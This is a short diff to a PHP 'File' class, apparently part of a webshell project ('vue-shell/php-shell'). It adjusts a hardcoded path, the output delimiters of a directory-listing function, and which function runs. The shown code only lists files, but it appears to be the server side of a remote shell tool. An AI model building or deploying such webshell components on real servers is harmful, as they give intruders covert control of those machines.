@@ -169,7 +169,7 @@ class File {
 
     function dir3() {
         //todo php5.2路径后缀不能为/，7.3版本可以
-        $dir = 'D:/safe/code/vue-shell/php-shell';
+        $dir = 'D:/safe/code/vue-shell';
         if (!@is_dir($dir)) {
             echo "ERROR:// Path Not Found Or No Permission!";
         } else {
@@ -180,7 +180,7 @@ class File {
                 }
                 $file = $dir . $value;
                 $res .= $value . '``';
-                $res .= is_dir($file) ? '1' : '0';
+                $res .= (is_dir($file) ? '1' : '0') . '``';
                 $res .= date("Y/m/d H:i", filemtime($file)) . '``';
                 $res .= @filesize($file);
                 $res .= "\n";
@@ -192,7 +192,6 @@ class File {
             encode($res);
         }
     }
-
 
     function pwd() {
         $path = dirname($_SERVER['SCRIPT_FILENAME']);
@@ -225,5 +224,5 @@ class File {
 }
 
 $f = new File();
-$f->dir4();
+$f->dir3();
 ?>
